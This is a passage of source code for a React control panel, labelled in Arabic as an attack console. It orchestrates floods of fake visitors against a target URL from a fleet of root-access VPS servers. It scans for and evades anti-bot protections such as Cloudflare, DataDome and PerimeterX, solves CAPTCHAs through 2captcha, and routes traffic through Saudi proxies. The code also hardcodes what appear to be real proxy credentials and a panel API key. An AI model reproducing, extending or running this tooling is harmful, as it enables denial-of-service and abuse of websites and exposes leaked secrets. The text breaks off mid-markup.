'use client';
import { useState, useEffect, useRef } from 'react';

export default function Home() {
  const [url, setUrl] = useState('');
  const [durationMin, setDurationMin] = useState('5');
  const [waveSize, setWaveSize] = useState('200');
  const [stayTime, setStayTime] = useState('35');
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(false);
  const [activeAction, setActiveAction] = useState('');
  const [showAdvanced, setShowAdvanced] = useState(false);
  const [showServerPanel, setShowServerPanel] = useState(false);
  const [servers, setServers] = useState(() => {
    if (typeof window !== 'undefined') {
      const saved = localStorage.getItem('servers');
      if (saved) try { return JSON.parse(saved); } catch(e) {}
    }
    return [
      { host: '138.68.141.40', username: 'root' },
      { host: '144.126.234.13', username: 'root' },
      { host: '46.101.52.177', username: 'root' },
      { host: '142.93.41.217', username: 'root' },
      { host: '167.99.94.250', username: 'root' },
      { host: '165.22.118.138', username: 'root' },
      { host: '167.71.135.147', username: 'root' },
      { host: '138.68.141.255', username: 'root' },
      { host: '206.189.21.125', username: 'root' }
    ];
  });
  const [newHost, setNewHost] = useState('');
  const [showApiKey, setShowApiKey] = useState(false);
  const [newUsername, setNewUsername] = useState('root');
  const [useProxy, setUseProxy] = useState(true);
  const [proxyHost, setProxyHost] = useState('proxy.packetstream.io');
  const [proxyPort, setProxyPort] = useState('31112');
  const [proxyUser, setProxyUser] = useState(() => {
    if (typeof window !== 'undefined') return localStorage.getItem('proxyUser') || 'fanar';
    return 'fanar';
  });
  const [proxyPass, setProxyPass] = useState(() => {
    if (typeof window !== 'undefined') {
      const saved = localStorage.getItem('proxyPass');
      // Fix old wrong password (RlM -> RIM)
      if (saved && saved.includes('RlM')) {
        const fixed = saved.replace('RlM', 'RIM');
        localStorage.setItem('proxyPass', fixed);
        return fixed;
      }
      // Auto-fix: add Saudi country suffix if missing
      if (saved && !saved.includes('_country-')) {
        const fixed2 = saved + '_country-SaudiArabia';
        localStorage.setItem('proxyPass', fixed2);
        return fixed2;
      }
      return saved || 'j7HGTQiRnys66RIM_country-SaudiArabia';
    }
    return 'j7HGTQiRnys66RIM_country-SaudiArabia';
  });
  const [monitoring, setMonitoring] = useState(false);
  const [serverStatus, setServerStatus] = useState([]);
  const [attackStartTime, setAttackStartTime] = useState(null);
  const [remainingSeconds, setRemainingSeconds] = useState(null);
  const [attackSummary, setAttackSummary] = useState(null);
  const [scanResult, setScanResult] = useState(null);
  const [scanning, setScanning] = useState(false);
  const [socketUrl, setSocketUrl] = useState('');
  const [captchaApiKey, setCaptchaApiKey] = useState(() => {
    if (typeof window !== 'undefined') return localStorage.getItem('captchaApiKey') || '';
    return '';
  });
  const [captchaService, setCaptchaService] = useState(() => {
    if (typeof window !== 'undefined') return localStorage.getItem('captchaService') || '2captcha';
    return '2captcha';
  });
  const [proxyStatus, setProxyStatus] = useState(null);
  const [phase, setPhase] = useState('idle'); // idle, scanning, starting, running, finished
  const intervalRef = useRef(null);
  const countdownRef = useRef(null);
  const [panelApiKey, setPanelApiKey] = useState(() => {
    if (typeof window !== 'undefined') return localStorage.getItem('panelApiKey') || 'Fadi@Attack2026!SecureKey#X9';
    return 'Fadi@Attack2026!SecureKey#X9';
  });

  // Persist
  useEffect(() => { if (panelApiKey) localStorage.setItem('panelApiKey', panelApiKey); }, [panelApiKey]);
  useEffect(() => { localStorage.setItem('captchaApiKey', captchaApiKey); }, [captchaApiKey]);
  useEffect(() => { localStorage.setItem('proxyUser', proxyUser); }, [proxyUser]);
  useEffect(() => { localStorage.setItem('proxyPass', proxyPass); }, [proxyPass]);
  useEffect(() => { localStorage.setItem('captchaService', captchaService); }, [captchaService]);
  useEffect(() => { localStorage.setItem('servers', JSON.stringify(servers)); }, [servers]);

  const addLog = (msg) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev]);

  // Proxy check
  const checkProxy = async () => {
    setProxyStatus('checking');
    try {
      const res = await fetch('/api/proxy-check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
        body: JSON.stringify({ host: proxyHost, port: proxyPort, username: proxyUser, password: proxyPass })
      });
      const data = await res.json();
      setProxyStatus(data.status);
      if (data.status === 'expired') addLog('⚠️ البروكسي منتهي');
      else if (data.status === 'active') addLog('✅ البروكسي شغال');
      else addLog(`⚠️ حالة البروكسي: ${data.message || data.status}`);
    } catch(e) {
      setProxyStatus('error');
      addLog('❌ فشل فحص البروكسي');
    }
  };

  useEffect(() => {
    if (useProxy && proxyHost && proxyUser && proxyPass) checkProxy();
  }, []);
  useEffect(() => {
    if (useProxy && proxyHost && proxyUser && proxyPass) checkProxy();
  }, [useProxy, proxyHost, proxyUser, proxyPass]);

  // Dynamic calculations
  const ws = parseInt(waveSize) || 200;
  const calcTotalVisits = (min) => (parseInt(min) || 0) * ws * 2 * servers.length;
  const calcTotalWaves = (min) => (parseInt(min) || 0) * 2;
  const totalVisitsEstimate = calcTotalVisits(durationMin);
  const totalWaves = calcTotalWaves(durationMin);
  const activeVisitorsEstimate = ws * servers.length;

  const formatDuration = (seconds) => {
    if (seconds <= 0) return '0 ثانية';
    if (seconds < 60) return `${seconds} ثانية`;
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return secs === 0 ? `${mins} دقيقة` : `${mins} دقيقة و ${secs} ثانية`;
  };

  const formatTime = (seconds) => {
    const m = Math.floor(seconds / 60);
    const s = Math.round(seconds % 60);
    return `${m}:${String(s).padStart(2, '0')}`;
  };

  // Countdown - simple time-based countdown from the duration the user set
  useEffect(() => {
    if (attackStartTime && monitoring) {
      // Calculate remaining based on real elapsed time since attack started
      const totalDurationMs = parseInt(durationMin) * 60 * 1000;
      const updateCountdown = () => {
        const elapsed = Date.now() - attackStartTime;
        const remaining = Math.max(0, Math.ceil((totalDurationMs - elapsed) / 1000));
        setRemainingSeconds(remaining);
        if (remaining <= 0) {
          setPhase('finished');
        }
      };
      updateCountdown();
      countdownRef.current = setInterval(updateCountdown, 1000);
      return () => clearInterval(countdownRef.current);
    }
  }, [attackStartTime, monitoring, durationMin]);

  // Check if all servers finished
  useEffect(() => {
    if (attackStartTime && monitoring && serverStatus.length > 0) {
      const activeServers = serverStatus.filter(s => s.status === 'running' || s.status === 'starting');
      const finishedServers = serverStatus.filter(s => s.status === 'finished');
      if (activeServers.length === 0 && finishedServers.length > 0) {
        setRemainingSeconds(0);
        setPhase('finished');
      }
    }
  }, [serverStatus, attackStartTime, monitoring]);

  // Fetch status
  const fetchStatus = async () => {
    try {
      const res = await fetch('/api/status', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
        body: JSON.stringify({ servers })
      });
      const data = await res.json();
      if (data.results) {
        const filtered = data.results.map(s => {
          if (s.status === 'finished' && !attackStartTime) return { ...s, status: 'idle', visits: 0, target: 0, progress: 0, elapsed: 0, errors: 0 };
          if (s.timestamp && attackStartTime && (s.timestamp * 1000) < attackStartTime) return { ...s, status: 'starting', visits: 0, target: ws * totalWaves, progress: 0, elapsed: 0, errors: 0 };
          return s;
        });
        setServerStatus(filtered);
        const activeServers = filtered.filter(s => s.status === 'running');
        const finishedServers = filtered.filter(s => s.status === 'finished');
        if (activeServers.length > 0) setPhase('running');
        if (activeServers.length === 0 && finishedServers.length > 0) {
          stopMonitoring();
          setPhase('finished');
          const sumVisits = filtered.reduce((sum, s) => sum + (s.visits || 0), 0);
          const sumErrors = filtered.reduce((sum, s) => sum + (s.errors || 0), 0);
          const maxElapsed = Math.max(...filtered.map(s => s.elapsed || 0), 0);
          const totalRate = maxElapsed > 0 ? Math.round((sumVisits / maxElapsed) * 60) : 0;
          const totalActive = filtered.reduce((sum, s) => sum + (s.active_visitors || 0), 0);
          const peakActive = Math.max(...filtered.map(s => s.peak_active || 0), 0);
          const sumVerified = filtered.reduce((sum, s) => sum + (s.verified_visitors || 0), 0);
          const sumBlocked = filtered.reduce((sum, s) => sum + (s.blocked_visitors || 0), 0);
          const peakVerified = Math.max(...filtered.map(s => s.peak_verified || 0), 0);
          setAttackSummary({ target: totalVisitsEstimate, visits: sumVisits, errors: sumErrors, elapsed: maxElapsed, rate: totalRate, activeVisitors: totalActive, peakActive, verifiedVisitors: sumVerified, blockedVisitors: sumBlocked, peakVerified });
          addLog(`✅ انتهت جميع العمليات | ${sumVisits} زيارة | ✅ ${sumVerified} متحقق | 🚫 ${sumBlocked} محظور | ${sumErrors} خطأ | ${formatTime(maxElapsed)} | ${totalRate}/دقيقة`);
        }
      }
    } catch (err) {}
  };

  const startMonitoring = () => { setMonitoring(true); fetchStatus(); intervalRef.current = setInterval(fetchStatus, 15000); };
  const stopMonitoring = () => { setMonitoring(false); if (intervalRef.current) { clearInterval(intervalRef.current); intervalRef.current = null; } };
  useEffect(() => { return () => { if (intervalRef.current) clearInterval(intervalRef.current); }; }, []);

  const addServer = () => {
    if (!newHost) return addLog('❌ الرجاء إدخال عنوان IP');
    if (servers.find(s => s.host === newHost)) return addLog('❌ السيرفر موجود');
    setServers(prev => [...prev, { host: newHost, username: newUsername || 'root' }]);
    addLog(`✅ تمت إضافة: ${newHost}`);
    setNewHost(''); setNewUsername('root');
  };
  const removeServer = (host) => { setServers(prev => prev.filter(s => s.host !== host)); addLog(`🗑️ تم حذف: ${host}`); };

  const buildProxyList = () => {
    if (!useProxy || !proxyUser || !proxyPass) return [];
    return [{ host: proxyHost, port: proxyPort, username: proxyUser, password: proxyPass }];
  };

  // ===== MAIN ACTION: One-click Start (scan + start) =====
  const handleStart = async () => {
    if (!url) return addLog('❌ ادخل الرابط أولاً');
    if (!/^https?:\/\//i.test(url)) return addLog('❌ الرابط لازم يبدأ بـ http:// أو https://');
    if (servers.length === 0) return addLog('❌ لا يوجد سيرفرات');

    setLoading(true);
    setActiveAction('start');
    setScanResult(null);
    setServerStatus([]);
    setAttackStartTime(null);
    setRemainingSeconds(null);
    setAttackSummary(null);
    stopMonitoring();

    // Phase 1: Auto-scan
    setPhase('scanning');
    addLog(`🔍 جاري فحص ${url} تلقائياً...`);
    
    let detectedScanResult = null;
    try {
      // Primary: Smart scan from Vercel (faster, can read JS bundles directly)
      addLog(`🔍 فحص ذكي من السيرفر...`);
      const scanRes = await fetch('/api/scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
        body: JSON.stringify({ url, proxies: buildProxyList() })
      });
      const scanData = await scanRes.json();
      if (scanData.scanResult) {
        // Always use Vercel scan result (has full 7-layer detection)
        detectedScanResult = scanData.scanResult;
        if (detectedScanResult.has_socketio && detectedScanResult.socket_url) {
          addLog(`✅ تم اكتشاف Socket.IO: ${detectedScanResult.socket_url}`);
        }
        addLog(`✅ فحص ذكي: الوضع ${detectedScanResult.mode} | الحماية: ${detectedScanResult.protection || 'none'}`);
      } else {
        // Fallback: VPS-based scan (only if Vercel scan completely failed)
        addLog(`🔄 فحص بديل من VPS...`);
        const scanRes2 = await fetch('/api/control', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
          body: JSON.stringify({ action: 'scan', url, servers, proxies: buildProxyList() })
        });
        const scanData2 = await scanRes2.json();
        if (scanData2.scanResult) {
          detectedScanResult = scanData2.scanResult;
        }
      }
      
      if (detectedScanResult) {
        setScanResult(detectedScanResult);
        const modeNames = { socketio: '🔌 Socket.IO', cloudflare: '☁️ Cloudflare', browser: '🌐 متصفح حقيقي', http: '🌐 HTTP مباشر' };
        const protNames = { cloudflare: 'Cloudflare', akamai: 'Akamai', datadome: 'DataDome', perimeterx: 'PerimeterX', none: 'لا يوجد' };
        addLog(`✅ الحماية: ${protNames[detectedScanResult.protection] || detectedScanResult.protection || 'غير معروف'} | الوضع: ${modeNames[detectedScanResult.mode] || detectedScanResult.mode}`);
        if (detectedScanResult.protection_level) addLog(`🛡️ مستوى الحماية: ${detectedScanResult.protection_level} | الوصول للمحتوى: ${detectedScanResult.real_content_reached ? '✅ نعم' : '❌ لا'}`);
        if (detectedScanResult.protection_names?.length > 0) addLog(`🔍 حمايات مكتشفة: ${detectedScanResult.protection_names.join(', ')}`);
        if (detectedScanResult.challenge_type && detectedScanResult.challenge_type !== 'none') addLog(`⚠️ تحدي: ${detectedScanResult.challenge_type}`);
        if (detectedScanResult.socket_url) addLog(`🔌 Socket URL مكتشف: ${detectedScanResult.socket_url}`);
        if (detectedScanResult.captcha_type || detectedScanResult.captcha_info?.type) addLog(`🔑 CAPTCHA: ${detectedScanResult.captcha_info?.type || detectedScanResult.captcha_type}`);
        if (detectedScanResult.recommended_strategy) addLog(`💡 الاستراتيجية: ${detectedScanResult.recommended_strategy}`);
      } else {
        addLog(`⚠️ فشل الفحص - سيتم استخدام الوضع التلقائي`);
      }
    } catch(e) {
      addLog(`⚠️ خطأ في الفحص: ${e.message} - سيتم المتابعة`);
    }

    // Phase 2: Start attack
    setPhase('starting');
    addLog(`🚀 جاري بدء الهجوم على ${servers.length} سيرفرات...`);
    addLog(`📊 المدة: ${durationMin} دقيقة | الموجة: ${waveSize} زائر | البقاء: ${stayTime}ث | 👥 ~${activeVisitorsEstimate} نشط`);

    try {
      // Only pass socket URL if: (1) user set it manually, OR (2) scan found it AND mode is socketio
      // Do NOT pass protection service URLs (DataDome, etc.) as socket URLs
      let effectiveSocketUrl = socketUrl || undefined;
      if (!effectiveSocketUrl && detectedScanResult?.socket_url && detectedScanResult?.mode === 'socketio') {
        effectiveSocketUrl = detectedScanResult.socket_url;
      }
      const res = await fetch('/api/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
        body: JSON.stringify({
          action: 'start', url,
          durationMin: parseInt(durationMin),
          waveSize: parseInt(waveSize),
          stayTime: parseInt(stayTime),
          servers,
          proxies: buildProxyList(),
          socketUrl: effectiveSocketUrl,
          captchaApiKey: captchaApiKey || undefined,
          captchaService: captchaService || undefined,
          forceMode: detectedScanResult?.mode || undefined,
          forceProtection: detectedScanResult?.protection || undefined
        })
      });
      const data = await res.json();
      if (data.error) {
        addLog(`❌ ${data.error}`);
        setPhase('idle');
      } else {
        let successCount = 0;
        data.results.forEach(r => {
          if (r.status === 'success') { successCount++; addLog(`✅ ${r.host}: ${r.output || 'تم'}`); }
          else addLog(`❌ ${r.host}: ${r.error}`);
        });
        if (successCount > 0) {
          setPhase('running');
          setAttackStartTime(Date.now());
          setRemainingSeconds(parseInt(durationMin) * 60);
          addLog(`⚡ تم البدء على ${successCount}/${servers.length} سيرفرات`);
          setTimeout(startMonitoring, 8000);
        } else {
          addLog('❌ فشل البدء على جميع السيرفرات');
          setPhase('idle');
        }
      }
    } catch (err) {
      addLog(`❌ خطأ: ${err.message}`);
      setPhase('idle');
    }
    setLoading(false);
    setActiveAction('');
  };

  // Stop
  const handleStop = async () => {
    setLoading(true);
    setActiveAction('stop');
    addLog('⏹️ جاري إيقاف الهجوم...');
    try {
      const res = await fetch('/api/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
        body: JSON.stringify({ action: 'stop', servers })
      });
      const data = await res.json();
      if (data.results) data.results.forEach(r => addLog(r.status === 'success' ? `✅ ${r.host}: تم الإيقاف` : `❌ ${r.host}: ${r.error}`));
    } catch (err) { addLog(`❌ خطأ: ${err.message}`); }
    stopMonitoring();
    setServerStatus([]);
    setAttackStartTime(null);
    setRemainingSeconds(null);
    setPhase('idle');
    setLoading(false);
    setActiveAction('');
  };

  // Setup servers
  const handleSetup = async () => {
    setLoading(true);
    addLog('⚙️ جاري تجهيز السيرفرات...');
    try {
      const res = await fetch('/api/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
        body: JSON.stringify({ action: 'setup', servers })
      });
      const data = await res.json();
      if (data.results) data.results.forEach(r => addLog(r.status === 'success' ? `✅ ${r.host}: ${r.output || 'تم'}` : `❌ ${r.host}: ${r.error}`));
    } catch (err) { addLog(`❌ خطأ: ${err.message}`); }
    setLoading(false);
  };

  // Deploy script
  const handleDeploy = async () => {
    setLoading(true);
    addLog('📤 جاري رفع السكريبت...');
    try {
      const res = await fetch('/api/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-api-key': panelApiKey },
        body: JSON.stringify({ action: 'deploy', servers })
      });
      const data = await res.json();
      if (data.results) data.results.forEach(r => addLog(r.status === 'success' ? `✅ ${r.host}: ${r.output || 'تم'}` : `❌ ${r.host}: ${r.error}`));
    } catch (err) { addLog(`❌ خطأ: ${err.message}`); }
    setLoading(false);
  };

  const getStatusColor = (s) => ({ running:'#22c55e', starting:'#facc15', finished:'#3b82f6', idle:'#6b7280', offline:'#ef4444' }[s] || '#6b7280');
  const getStatusText = (s) => ({ running:'🟢 شغال', starting:'🟡 يبدأ...', finished:'🔵 انتهى', idle:'⚪ خامل', offline:'🔴 غير متصل' }[s] || '⚪');
  const getModeText = (m) => ({ socketio:'🔌 SOCKET', cloudflare:'☁️ FLARE', browser:'🌐 BROWSER', http:'🌐 HTTP', socket_wave:'🔌 SOCKET', wave_cf:'☁️ FLARE', wave_fast:'🌐 HTTP', detecting:'🔍 SCAN' }[m] || m || '');
  const getModeColor = (m) => ({ socketio:'#06b6d4', cloudflare:'#f97316', browser:'#a855f7', http:'#22c55e', socket_wave:'#06b6d4', wave_cf:'#f97316', wave_fast:'#22c55e', detecting:'#facc15' }[m] || '#6b7280');

  const ff = "'Courier New', 'Noto Sans Arabic', 'Segoe UI', Tahoma, monospace";
  const st = {
    page: { minHeight:'100vh', backgroundColor:'#000', color:'#22c55e', padding:'24px', fontFamily:ff, direction:'rtl' },
    box: { maxWidth:'850px', margin:'0 auto', border:'1px solid #166534', padding:'24px', borderRadius:'12px', backgroundColor:'#111827' },
    title: { fontSize:'26px', fontWeight:'bold', marginBottom:'20px', textAlign:'center', borderBottom:'1px solid #166534', paddingBottom:'12px', color:'#22c55e' },
    input: { width:'100%', backgroundColor:'#000', border:'1px solid #166534', padding:'10px 12px', borderRadius:'6px', color:'#fff', fontSize:'14px', fontFamily:ff, outline:'none', boxSizing:'border-box' },
    label: { display:'block', marginBottom:'6px', fontSize:'13px', color:'#22c55e' },
    btn: (bg) => ({ display:'flex', alignItems:'center', justifyContent:'center', gap:'6px', backgroundColor:bg, color:'#fff', padding:'14px 8px', borderRadius:'8px', cursor:'pointer', border:'none', fontSize:'14px', fontFamily:ff, transition:'opacity 0.2s', fontWeight:'bold' }),
    card: { backgroundColor:'#111827', border:'1px solid #1f2937', borderRadius:'8px', padding:'14px', marginBottom:'10px' },
    badge: (c) => ({ fontSize:'11px', padding:'2px 8px', borderRadius:'12px', color:c, border:`1px solid ${c}`, fontFamily:ff }),
  };

  const totalVisits = serverStatus.reduce((sum, x) => sum + (x.visits || 0), 0);
  const totalErrors = serverStatus.reduce((sum, x) => sum + (x.errors || 0), 0);
  const totalActiveVisitors = serverStatus.reduce((sum, x) => sum + (x.active_visitors || 0), 0);
  const totalVerifiedVisitors = serverStatus.reduce((sum, x) => sum + (x.verified_visitors || 0), 0);
  const totalBlockedVisitors = serverStatus.reduce((sum, x) => sum + (x.blocked_visitors || 0), 0);

  const phaseText = { idle: '⚪ جاهز', scanning: '🔍 يفحص الموقع...', starting: '🚀 يبدأ الهجوم...', running: '⚡ شغال', finished: '✅ انتهى' };
  const phaseColor = { idle: '#6b7280', scanning: '#facc15', starting: '#f97316', running: '#22c55e', finished: '#3b82f6' };

  return (
    <div style={st.page}>
      <div style={st.box}>
        <h1 style={st.title}>⚔️ لوحة التحكم v12</h1>

        {/* Phase indicator */}
        <div style={{ textAlign:'center', marginBottom:'16px', padding:'8px', backgroundColor:'#0a0a0a', borderRadius:'8px', border:`1px solid ${phaseColor[phase]}` }}>
          <span style={{ fontSize:'16px', color: phaseColor[phase], fontWeight:'bold' }}>{phaseText[phase]}</span>
          {phase === 'running' && <span style={{ fontSize:'12px', color:'#9ca3af', marginRight:'10px' }}> | 🖥️ {servers.length} سيرفرات | 👥 ~{activeVisitorsEstimate} نشط</span>}
        </div>

        {/* ===== MAIN CONTROLS: URL + Duration + Start/Stop ===== */}
        <div style={{ marginBottom:'16px' }}>
          <label style={st.label}>🔗 رابط الموقع المستهدف</label>
          <input type="text" value={url} onChange={(e) => { setUrl(e.target.value); setScanResult(null); }} placeholder="https://example.com" style={{...st.input, fontSize:'16px', padding:'14px'}} disabled={phase === 'running' || phase === 'scanning' || phase === 'starting'} />
        </div>

        <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:'12px', marginBottom:'16px' }}>
          <div>
            <label style={st.label}>⏱️ المدة (دقائق)</label>
            <input type="number" value={durationMin} onChange={(e) => setDurationMin(e.target.value)} min="1" style={{...st.input, textAlign:'center', fontSize:'16px'}} disabled={phase === 'running'} />
          </div>
          <div style={{ display:'flex', alignItems:'end' }}>
            <div style={{ width:'100%', textAlign:'center', padding:'12px', backgroundColor:'#0a1628', borderRadius:'8px', border:'1px solid #1e3a5f' }}>
              <div style={{ fontSize:'20px', fontWeight:'bold', color:'#06b6d4' }}>👥 {activeVisitorsEstimate.toLocaleString()}</div>
              <div style={{ fontSize:'10px', color:'#6b7280' }}>زائر نشط دائماً</div>
            </div>
          </div>
        </div>

        {/* Proxy - Username & Password (main view) */}
        <div style={{ marginBottom:'14px', border:'1px solid #166534', borderRadius:'8px', padding:'14px', backgroundColor:'#0a0a0a' }}>
          <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:'10px' }}>
            <div style={{ display:'flex', alignItems:'center', gap:'8px' }}>
              <span style={{ fontSize:'13px', color:'#22c55e' }}>🌐 بروكسي سعودي</span>
              <button onClick={() => setUseProxy(!useProxy)} style={{ background: useProxy ? '#22c55e' : '#374151', color:'#fff', border:'none', padding:'3px 14px', borderRadius:'12px', cursor:'pointer', fontSize:'11px', fontFamily:ff }}>
                {useProxy ? '✅ مفعّل' : '❌ معطّل'}
              </button>
            </div>
            {useProxy && proxyStatus === 'active' && <span style={{ background:'#052e16', color:'#4ade80', padding:'4px 12px', borderRadius:'12px', fontSize:'12px', border:'1px solid #22c55e' }}>✅ البروكسي شغال - عندك رصيد</span>}
            {useProxy && proxyStatus === 'expired' && <span style={{ background:'#450a0a', color:'#fca5a5', padding:'4px 12px', borderRadius:'12px', fontSize:'12px', border:'1px solid #dc2626' }}>❌ الرصيد خلص!</span>}
            {useProxy && proxyStatus === 'checking' && <span style={{ background:'#1a1a2e', color:'#facc15', padding:'4px 12px', borderRadius:'12px', fontSize:'12px', border:'1px solid #facc15' }}>⏳ يفحص...</span>}
            {useProxy && proxyStatus === 'error' && <span style={{ background:'#450a0a', color:'#fca5a5', padding:'4px 12px', borderRadius:'12px', fontSize:'12px', border:'1px solid #dc2626' }}>⚠️ خطأ بالفحص</span>}
          </div>
          {useProxy && (
            <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:'8px' }}>
              <div>
                <label style={{ fontSize:'11px', color:'#6b7280', marginBottom:'4px', display:'block' }}>Username</label>
                <input type="text" value={proxyUser} onChange={(e) => setProxyUser(e.target.value)} placeholder="اسم المستخدم" style={st.input} />
              </div>
              <div>
                <label style={{ fontSize:'11px', color:'#6b7280', marginBottom:'4px', display:'block' }}>Password</label>
                <input type="text" value={proxyPass} onChange={(e) => setProxyPass(e.target.value)} placeholder="كلمة المرور" style={st.input} />
              </div>
            </div>
          )}
        </div>

        {/* Start / Stop buttons */}
        <div style={{ display:'grid', gridTemplateColumns: phase === 'running' ? '1fr 1fr' : '1fr', gap:'10px', marginBottom:'16px' }}>
          {phase !== 'running' && (
            <button onClick={handleStart} disabled={loading || phase === 'scanning' || phase === 'starting'} style={{...st.btn('#16a34a'), opacity: loading ? 0.5 : 1, padding:'18px', fontSize:'18px'}}>
              {phase === 'scanning' ? '🔍 يفحص الموقع...' : phase === 'starting' ? '🚀 يبدأ...' : '▶️ بدء'}
            </button>
          )}
          {phase === 'running' && (
            <>
              <div style={{ textAlign:'center', padding:'14px', backgroundColor:'#052e16', borderRadius:'8px', border:'1px solid #22c55e' }}>
                <div style={{ fontSize:'18px', fontWeight:'bold', color:'#22c55e' }}>⚡ شغال</div>
              </div>
              <button onClick={handleStop} disabled={loading} style={{...st.btn('#dc2626'), opacity: loading ? 0.5 : 1, padding:'18px', fontSize:'16px'}}>
                {activeAction === 'stop' ? '⏳ يوقف...' : '⏹️ إيقاف'}
              </button>
            </>
          )}
        </div>

        {/* Scan Result (auto-shown after scan) */}
        {scanResult && (
          <div style={{ border:'1px solid #7c3aed', borderRadius:'8px', padding:'14px', marginBottom:'14px', backgroundColor:'#1a1033' }}>
            <div style={{ fontSize:'14px', color:'#a78bfa', marginBottom:'10px', fontWeight:'bold' }}>📋 نتيجة الفحص</div>
            <div style={{ display:'grid', gridTemplateColumns:'repeat(3, 1fr)', gap:'10px' }}>
              <div style={{ textAlign:'center', padding:'10px', backgroundColor:'#000', borderRadius:'8px', border:`1px solid ${getModeColor(scanResult.mode)}` }}>
                <div style={{ fontSize:'22px', color: getModeColor(scanResult.mode) }}>{getModeText(scanResult.mode)}</div>
                <div style={{ fontSize:'10px', color:'#9ca3af', marginTop:'4px' }}>الوضع</div>
              </div>
              <div style={{ textAlign:'center', padding:'10px', backgroundColor:'#000', borderRadius:'8px', border:'1px solid #374151' }}>
                <div style={{ fontSize:'22px', color: scanResult.has_cloudflare ? '#f97316' : '#22c55e' }}>{scanResult.has_cloudflare ? '☁️ نعم' : '✅ لا'}</div>
                <div style={{ fontSize:'10px', color:'#9ca3af', marginTop:'4px' }}>Cloudflare</div>
              </div>
              <div style={{ textAlign:'center', padding:'10px', backgroundColor:'#000', borderRadius:'8px', border:'1px solid #374151' }}>
                <div style={{ fontSize:'22px', color:'#06b6d4' }}>{scanResult.pages?.length || 0}</div>
                <div style={{ fontSize:'10px', color:'#9ca3af', marginTop:'4px' }}>صفحات</div>
              </div>
            </div>

            {/* NEW: Advanced Detection Results */}
            {scanResult.protection_level && (
              <div style={{ display:'grid', gridTemplateColumns:'repeat(3, 1fr)', gap:'10px', marginTop:'10px' }}>
                <div style={{ textAlign:'center', padding:'10px', backgroundColor:'#000', borderRadius:'8px', border:`1px solid ${{none:'#22c55e',low:'#22c55e',medium:'#facc15',high:'#f97316',extreme:'#ef4444'}[scanResult.protection_level] || '#374151'}` }}>
                  <div style={{ fontSize:'16px', fontWeight:'bold', color: {none:'#22c55e',low:'#22c55e',medium:'#facc15',high:'#f97316',extreme:'#ef4444'}[scanResult.protection_level] || '#6b7280' }}>
                    {{none:'✅ بدون',low:'🟢 خفيف',medium:'🟡 متوسط',high:'🟠 قوي',extreme:'🔴 شديد'}[scanResult.protection_level] || scanResult.protection_level}
                  </div>
                  <div style={{ fontSize:'10px', color:'#9ca3af', marginTop:'4px' }}>مستوى الحماية</div>
                </div>
                <div style={{ textAlign:'center', padding:'10px', backgroundColor:'#000', borderRadius:'8px', border:'1px solid #374151' }}>
                  <div style={{ fontSize:'16px', fontWeight:'bold', color: scanResult.real_content_reached ? '#22c55e' : '#ef4444' }}>
                    {scanResult.real_content_reached ? '✅ وصل' : '❌ محظور'}
                  </div>
                  <div style={{ fontSize:'10px', color:'#9ca3af', marginTop:'4px' }}>الوصول للمحتوى</div>
                </div>
                <div style={{ textAlign:'center', padding:'10px', backgroundColor:'#000', borderRadius:'8px', border:'1px solid #374151' }}>
                  <div style={{ fontSize:'16px', fontWeight:'bold', color:'#a78bfa' }}>{scanResult.detection_confidence || 0}%</div>
                  <div style={{ fontSize:'10px', color:'#9ca3af', marginTop:'4px' }}>دقة الكشف</div>
                </div>
              </div>
            )}

            {/* Protection Names */}
            {scanResult.protection_names && scanResult.protection_names.length > 0 && (
              <div style={{ marginTop:'10px', padding:'8px', backgroundColor:'#000', borderRadius:'6px', border:'1px solid #374151' }}>
                <div style={{ fontSize:'11px', color:'#f97316', marginBottom:'4px' }}>🛡️ الحمايات المكتشفة:</div>
                <div style={{ display:'flex', flexWrap:'wrap', gap:'6px' }}>
                  {scanResult.protection_names.map((name, i) => (
                    <span key={i} style={{ fontSize:'11px', padding:'3px 10px', borderRadius:'12px', backgroundColor:'#1a1033', color:'#f97316', border:'1px solid #7c3aed' }}>{name}</span>
                  ))}
                </div>
              </div>
            )}

            {/* Challenge & CAPTCHA Info */}
            {scanResult.challenge_type && scanResult.challenge_type !== 'none' && (
              <div style={{ marginTop:'8px', padding:'6px 10px', backgroundColor:'#451a03', borderRadius:'6px', border:'1px solid #f97316' }}>
                <span style={{ fontSize:'11px', color:'#fb923c' }}>⚠️ تحدي: {{js_challenge:'JS Challenge',managed_challenge:'Managed Challenge',captcha:'CAPTCHA',interactive_captcha:'Interactive CAPTCHA',blocked:'محظور بالكامل',sensor_challenge:'Sensor Challenge'}[scanResult.challenge_type] || scanResult.challenge_type}</span>
              </div>
            )}

            {scanResult.captcha_info?.type && (
              <div style={{ marginTop:'6px', fontSize:'11px', color:'#f59e0b' }}>🔑 CAPTCHA: {scanResult.captcha_info.type} {scanResult.captcha_info.siteKey ? `(Key: ${scanResult.captcha_info.siteKey.substring(0,15)}...)` : ''}</div>
            )}

            {scanResult.socket_url && <div style={{ marginTop:'8px', fontSize:'11px', color:'#06b6d4' }}>🔌 Socket: {scanResult.socket_url}</div>}

            {/* Strategy Recommendation */}
            {scanResult.recommended_strategy && (
              <div style={{ marginTop:'8px', padding:'8px', backgroundColor:'#052e16', borderRadius:'6px', border:'1px solid #166534' }}>
                <div style={{ fontSize:'11px', color:'#4ade80' }}>💡 {scanResult.recommended_strategy}</div>
              </div>
            )}
          </div>
        )}

        {/* Countdown */}
        {remainingSeconds !== null && (
